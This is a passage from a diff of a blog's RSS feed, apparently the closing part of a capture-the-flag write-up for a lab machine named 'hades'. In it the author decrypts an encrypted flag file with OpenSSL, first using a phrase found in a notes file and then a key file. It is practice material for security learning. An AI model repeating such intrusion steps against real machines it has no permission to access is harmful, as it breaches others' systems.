+Salted__
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I remembered the notes file I originally found in loki&amp;rsquo;s home dir:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;AES 256 CBC
+Good for you and good for me.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At first I tried this phrase as a key within OpenSSL:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/hades# openssl enc -d -aes-256-cbc -in flag.txt.enc -k &amp;quot;Good for you and good for me&amp;quot; -out flag.txt
+bad decrypt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried mangling the phrase, but nothing worked.  I eventually remembered the &lt;code&gt;key_file&lt;/code&gt; and after feeding this into &lt;code&gt;OpenSSL&lt;/code&gt;, the file was successfully decrypted!&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/hades# openssl enc -d -aes-256-cbc -in flag.txt.enc -pass file:key_file -out flag.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/hades/flag.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
